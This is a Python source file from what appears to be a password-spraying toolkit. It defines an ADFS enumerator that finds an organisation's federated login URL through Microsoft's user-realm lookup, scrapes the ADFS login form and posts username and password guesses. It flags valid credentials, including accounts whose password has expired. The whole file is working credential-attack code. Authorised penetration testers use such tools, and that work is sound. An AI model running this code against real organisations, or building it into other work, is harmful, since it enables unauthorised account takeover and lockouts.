import os
import uuid

import requests
from requests_ntlm import HttpNtlmAuth

from enumerators.enumerator import VpnEnumerator, ScanType
from bs4 import BeautifulSoup

from utils.ntlmdecoder import ntlmdecode
from utils.utils import time_label, logfile, get_project_root, success, debug


# Disclaimer
# The code for the OWA enumerator has been copied and adapted from SprayingToolkit
# https://github.com/byt3bl33d3r/SprayingToolkit/blob/master/core/sprayers/owa.py
# CREDIT: @byt3bl33d3r

class AdfsEnumerator(VpnEnumerator):
    def __init__(self, target, group=None):
        super().__init__()
        self.target = target
        self.auth_url = None
        self.get_auth_url()

    def logfile(self, st: ScanType) -> str:
        fmt = os.path.basename(self.config.get("LOGGING", "file"))
        return str(get_project_root().joinpath("data").joinpath(logfile(fmt=fmt, script=__file__, scan_type=st.name)))

    def validate(self) -> bool:
        return self.auth_url is not None

    def get_auth_url(self):
        url = f"https://login.microsoftonline.com:443/getuserrealm.srf?login={self.target}"
        res = self.session.get(url)
        user_realm = res.json()
        if user_realm["NameSpaceType"] not in ["Unknown", "Managed"] and "AuthURL" in user_realm.keys():
            self.auth_url = user_realm["AuthURL"]

    def login(self, username, password) -> tuple:
        if not self.auth_url:
            return False, 0, 0
        form = None
        res = self.session.get(self.auth_url)
        if res.status_code == 200:
            soup = BeautifulSoup(res.text, features="html.parser")
            form = soup.find("form", {"id": "loginForm"})
        if not form or not form.has_attr("action"):
            debug("Something went wrong recovering the login URL+uuid", indent=2)
            client_request_id = str(uuid.uuid4())
            url = f"{res.url}&client-request-id={client_request_id}"
        else:
            url = "/".join(res.url.split("/")[:3]) + form["action"]

        data = {
            "UserName": username,
            "Password": password,
            "AuthMethod": "FormsAuthentication"
        }

        res = self.session.post(url, data=data)
        if res.status_code == 302:
            return True, str(res.status_code), len(res.content)
        elif res.text.find("Your password has expired") > -1:
            success(f"{username}:{password} is valid but the password has expired", indent=2)
            return True, str(res.status_code), len(res.content)
        return False, str(res.status_code), len(res.content)
